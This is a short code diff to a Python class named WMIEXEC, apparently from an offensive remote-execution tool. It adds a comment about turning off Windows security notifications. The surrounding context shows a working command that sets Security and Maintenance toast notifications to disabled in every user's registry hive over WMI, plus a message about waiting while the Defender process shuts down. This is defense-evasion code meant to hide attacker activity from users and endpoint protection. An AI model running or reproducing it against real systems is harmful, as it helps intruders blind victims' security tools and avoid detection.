@@ -164,6 +164,8 @@ class WMIEXEC:
     def disable_notifications(self):
         """
         Cant figure out how to make these apply at runtime??
+        https://www.tenforums.com/tutorials/105486-enable-disable-notifications-windows-security-windows-10-a.html
+        Maybe just stop the notification service?
         """
         command = self.__shell + """"FOR /F %a IN ('REG.EXE QUERY hku 2^>NUL ^| FIND ^"HKEY_USERS^"') DO REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance^" /v ^"Enabled^" /d ^"0^" /t REG_DWORD /F" """
 
@@ -183,3 +185,4 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         print('            [!] Sleeping to allow defender process to finish shutting down[!] ')
         time.sleep(8)
+        
